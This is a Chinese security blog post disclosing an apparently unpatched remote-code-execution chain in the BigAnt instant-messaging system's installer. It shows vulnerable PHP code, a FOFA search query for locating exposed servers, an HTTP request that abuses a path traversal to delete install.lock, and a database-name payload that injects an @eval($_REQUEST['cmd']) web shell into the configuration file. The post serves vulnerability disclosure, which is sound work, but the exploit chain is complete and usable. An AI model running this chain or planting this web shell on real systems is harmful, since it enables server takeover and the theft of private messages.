---
title: "大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞"
source: https://mrxn.net/jswz/bigant-install-config-rce.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-安装程序二次注入致远程代码执行漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/26 13:32
- 265浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

应用程序

SQL

application

---

# 漏洞简介

大蚂蚁 (BigAnt) 即时通讯系统安装程序存在二次注入漏洞。攻击者可通过删除或重命名 install.lock 文件，重新进入安装流程，并在数据库配置部分（如数据库用户、IP、端口、数据库名等字段）注入恶意 PHP 代码，实现[远程代码执行](https://mrxn.net/tag/rce)。

# 影响版本

BigAnt 5.5.x 及以上版本用户

短信和即时消息

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

软件

深入探索

即时通信

脚本语言

Application

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

先看安装程序的安装流程 Application/Install/Controller/InstallController.class.php 分为如下几个步骤

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-002-77edd4e0e247.webp)](https://image.mrxn.net/4f9be530b01e42d3a1f224e253455ad1.webp)

其中在初始化的部分检测是否存在安装文件 `data/install.lock`

深入探索

安全

传输层安全性协议

安全研究工具

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-003-03d999e73dfc.webp)](https://image.mrxn.net/450ce94900af4518a4c965163e76c2c8.webp)

如果存在则会直接退出，否则进入下一步，其中在第二步创建数据库的部分存在如下代码

代码安全审计

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-004-183aed01407f.webp)](https://image.mrxn.net/bef997d534834fe39aed61f62f875ce6.webp)

其中调用了 `sp_create_config()` 方法进行配置文件的创建，而配置文件信息由用户提供

漏洞修复方案

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-005-f74d6b9b088b.webp)](https://image.mrxn.net/fa0277d7ce404308bae646cd4e6f2ec7.webp)

其中对部分字段如domain、email等有正则校验

数据管理

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-006-5f2dcda91de8.webp)](https://image.mrxn.net/5f5ec9a531864693badcdbc6fa58c2d3.webp)

但是其余字段如数据库的dbtype、dbhost、dbname、dbuser、dbpwd等字段没有校验，被直接传递给`sp_create_config()` 方法，看下它的实现方式

短信和即时消息

```
function sp_create_config($config){

    sp_show_msg(L('_CREATE_CONFIG_PAGE_'));

    //windows的系统用GBK ，否则用 UTF-8,这个编码主要是文件系统时用到
    $os = strtoupper(substr(PHP_OS,0,3))==='WIN'?'windows':'linux';
    $config['CHARSET_OUT'] = $os == 'windows'?'GBK':'UTF-8';
    $config['DEFAULT_LANG'] = C('DEFAULT_LANG');

    if(is_array($config)){

       //读取配置内容
       $conf = file_get_contents(MODULE_PATH . 'Data/config.php');

       //替换配置项
       foreach ($config as $key => $value) {
          $conf = str_replace("#{$key}#", $value, $conf);
       }

       //写入应用配置文件
       if(file_put_contents( 'Application/Common/Conf/config.php', $conf)){
          sp_show_msg(L('_CONFIG_WRITE_SUCCESS_'));
       } else {
          sp_show_msg(L('_CONFIG_WRITE_FALIED_'), 'error');
          session('error', true);
       }
    }
```

读取 `Application/Install/Data/config.php`配置文件模板，然后进行替换操作

软件

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-007-b5a080d857b7.webp)](https://image.mrxn.net/2474ef19700a494bad53b0c85a3ee472.webp)

替换前端传过来的配置信息后，写入`Application/Common/Conf/config.php`文件中，如果我们可以找到一个文件删除/重命名[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，删除掉/重命名`data/install.lock`，那么就可以二次安装代码注入了。

数据管理

经过搜索，在 `Application/Addin/Controller/PedometerController.class.php`找到了一处比较简单的方法 `uploadImgCallback()`

虽然此方法需要鉴权，但是可以通过其他方式如鉴权绕过、或者弱口令、钓鱼等方式获取到一个用户权限，重点看下它的实现方式

```
function uploadImgCallback(){
    $userId = I('userId');
    $src = I('src');
    $M_PedometerUser = D('Addin/PedometerUser');
    $where['user_id'] = $userId;
    $user= $M_PedometerUser->where($where)->find();
    if($user['background_img']){
       unlink(sp_charset_in2out(getPhysicalPath($user['background_img'])));
    }

    unset($where);

    $data['background_img'] = $src;
    $where['user_id'] = $userId;
    $res = $M_PedometerUser ->where($where)->save($data);
    $this->success($res);
}
```

`Addin/PedometerUser`模型定义如下

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-008-ffd514aaa85e.webp)](https://image.mrxn.net/8acb69781dc846429094cede92745a15.webp)

如果从数据库antdbms\_bigant（企业名）的ext\_jb\_user表中获取到了指定userId的background\_img值如果路径不存在，则更新表，否则先删除文件。其中getPhysicalPath、sp\_charset\_in2out方法实现如下

软件

```
function getPhysicalPath($path){
    $patten = '/data(.*)/';
    preg_match($patten,$path,$pachPhy);
    $documentRoot = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
    return $documentRoot.'/'.$pachPhy[0];
}
```

我们只需要传递的src值是/data开头即可满足条件。

```
function sp_charset_in2out($str){
    $os = strtoupper(substr(PHP_OS,0,3))==='WIN'?'windows':'linux';
    $charset_out = $os == 'windows'?'GBK':'UTF-8';
    if (C('CHARSET_IN') != $charset_out){
       $str = iconv(C('CHARSET_IN'), $charset_out ,$str) ;
    }

    return $str ;
}
```

sp\_charset\_in2out 转码功能，不会处理路径。

代码安全审计

完整利用流程：任意用户权限==>更新background\_img==>删除`install_bak.lock`==>安装配置注入RCE

# 漏洞复现

## 设置路径

```
POST /?m=Addin&c=Pedometer&a=uploadImgCallback HTTP/1.1
Host: bigant.mrxn.net
Cookie: PHPSESSID=xxxxx
Content-Type: application/x-www-form-urlencoded

userId=1&src=/data/../data/install.lock
```

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-009-48143d1f6f79.webp)](https://image.mrxn.net/7b60c73361b7438aaeb561e33b7b7e37.webp)

同一个包需要发送两次，第一次更新表，第二次触发删除操作

搜索引擎

## RCE

访问 /install/install 安装配置，选择其他数据库,如果选择mysql需要数据库服务器存在且可以连通

```
//检测连接是否有效
$db  = Db::getInstance($dbconfig);
$sql = \Common\Lib\DBHelper::getCheckConnSql($dbconfig['DB_TYPE']);
$result = $db->query($sql);
if(false === $result){
       $url = U('step2',array('dbtype'=>$dbType,'err'=>'db'));
       $this->error(L('_ERROR_DB_CONNECT_'),$url);
   }
```

否则可以选择Oracle,会跳过存活检测

```
switch(strtolower($dbType)){
    case "oracle":
        break; // 直接跳过，不执行 createDataBase
    default:
        $res = \Common\Lib\DBHelper::createDataBase(...);
}
```

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-010-f9d65ed56507.webp)](https://image.mrxn.net/1a137034164b42d69142dfe41193a3d1.webp)

下一步

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-011-f298a7adab60.webp)](https://image.mrxn.net/f4fcb8cf016f4a549a86dd9b95256c3e.webp)

比如，将数据库名设置成`antdbms', 'test' => @eval($_REQUEST['cmd']),'`

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-012-1d15eabb1e34.webp)](https://image.mrxn.net/57a50759e36e497b94bf894ad23d0207.webp)

下一步

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-013-3d20c90c9272.webp)](https://image.mrxn.net/e3d891f374e74fb49d2a253bb4f245ef.webp)

查看 Application/Common/Conf/config.php 配置文件如下图所示

数据管理

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-014-a0032e7e5dfb.webp)](https://image.mrxn.net/4c9484aae0384ec898886efeae7b9614.webp)

成功写入并[执行php代码](https://mrxn.net/tag/rce)

[![大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](images/img-015-ec3847c2adc2.webp)](https://image.mrxn.net/f1b4990b9e4d4ab38c1130fb387da78c.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.设置路径](#toc-5-1-)
- [5.2.RCE](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
